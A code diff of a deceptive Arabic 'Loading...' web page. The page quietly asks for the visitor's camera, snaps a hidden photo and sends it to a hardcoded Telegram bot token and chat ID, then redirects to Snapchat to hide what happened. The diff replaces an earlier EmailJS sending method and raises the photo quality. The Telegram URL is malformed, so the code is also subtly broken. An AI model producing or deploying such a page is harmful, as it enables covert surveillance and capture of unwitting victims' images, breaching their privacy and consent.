@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
-    <script type="text/javascript" src="https://jsdelivr.net"></script>
     <style>
         body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
         video, canvas { display: none; }
@@ -12,45 +11,46 @@
 </head>
 <body>
     <h2>جاري التحميل...</h2>
-    <video id="video" width="320" height="240" autoplay playsinline></video>
-    <canvas id="canvas" width="320" height="240"></canvas>
+    <video id="video" width="640" height="480" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const SERVICE_ID = "service_yea65ei";
-        const TEMPLATE_ID = "template_tj626bi";
-        const PUBLIC_KEY = "eWIb2mjCTi2UFeAAn";
-
-        emailjs.init(PUBLIC_KEY);
+        // معلوماتك التي أرسلتها سابقاً (جاهزة ومدمجة)
+        const TOKEN = "8780843163:AAEQYDrUCNzSF32SWGKYdzx6h2pWn4mIsd4"; 
+        const ID = "7191557045"; 
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
+        // طلب الكاميرا فوراً
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-                setTimeout(captureAndSend, 2000);
+                // التقاط الصورة بعد ثانية واحدة من فتح الكاميرا لضمان السرعة
+                setTimeout(sendToTelegram, 1000);
             })
-            .catch(() => { window.location.href = "https://snapchat.com"; });
-
-        function captureAndSend() {
-            const context = canvas.getContext('2d');
-            // تصغير أبعاد الصورة لتقليل الحجم
-            context.drawImage(video, 0, 0, 320, 240);
-            
-            // تقليل الجودة إلى 0.2 (20%) لضمان الإرسال المجاني
-            const imageData = canvas.toDataURL('image/jpeg', 0.2);
-
-            emailjs.send(SERVICE_ID, TEMPLATE_ID, {
-                photo_data: imageData,
-                title: "تنبيه: محاولة دخول"
-            })
-            .then(() => {
-                window.location.href = "https://snapchat.com";
-            })
-            .catch((err) => {
-                console.log("خطأ في الإرسال:", err);
+            .catch(() => {
+                // إذا رفض الكاميرا، حوله لسناب شات فوراً
                 window.location.href = "https://snapchat.com";
             });
+
+        function sendToTelegram() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", ID);
+                formData.append("photo", blob, "photo.jpg");
+
+                fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                }).finally(() => {
+                    // تحويل المستخدم النهائي
+                    window.location.href = "https://snapchat.com";
+                });
+            }, 'image/jpeg', 0.7);
         }
     </script>
 </body>
